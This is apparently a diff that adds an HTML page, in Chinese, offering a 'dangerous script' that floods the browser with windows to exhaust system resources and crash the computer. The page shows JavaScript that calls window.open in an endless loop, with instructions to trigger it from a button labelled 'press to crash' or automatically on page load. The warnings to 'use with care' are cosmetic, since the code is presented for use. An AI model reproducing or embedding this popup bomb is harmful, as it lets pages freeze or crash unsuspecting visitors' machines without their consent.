@@ -1,0 +1,52 @@
+<html>
+<head>
+<title>弹出无数的窗口-危险脚本</title>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<style type="text/css">
+<!--
+body {  font-family: "宋体"; font-size: 9pt; margin-top: 0px}
+.pt9 { font-family: "宋体"; font-size: 9pt}
+-->
+</style>
+<meta name="keywords" content="killwindow killwin 当机 死机 kill">
+<meta name="description" content="一个能弹出无数窗口的脚本，迅速耗尽系统资源。">
+</head>
+
+<body bgcolor="#FFFFFF">
+<center>
+</center>
+<form>
+  <div align="center"> <font color="#FF0033" size="3">迅速耗尽计算机资源</font>--危险脚本，小心使用</div>
+</form>
+<form>
+  <div align="center">
+    <p>
+      <input type="button" name="Button" value="按一下当机" onclick="killwin()" class="pt9">
+    </p>
+    <p>
+      <textarea name="textfield" wrap="VIRTUAL" cols="50" rows="10" class="pt9">**********危险脚本，小心使用。**********
+
+&lt;script language=&quot;JavaScript&quot;&gt;
+function killwin()
+{
+    var number = 0    
+    while (true)
+ {
+    window.open(&quot;index.html&quot;,&quot;killwin&quot; + number,&quot;width=100,height=100,resizable=no&quot;)
+     number++
+  }
+}
+&lt;/script&gt;
+然后，通过2种方法激活：
+（1）用按钮：
+&lt;input type=&quot;button&quot; name=&quot;Button&quot; value=&quot;按一下当机&quot; onclick=&quot;killwin()&quot;&gt;
+（2）页面一读就发生：
+&lt;body onload=&quot;killwin()&quot;&gt;
+
+**********危险脚本，小心使用。**********</textarea>
+    </p>
+  </div>
+</form>
+<p>&nbsp;</p>
+</body>
+</html>
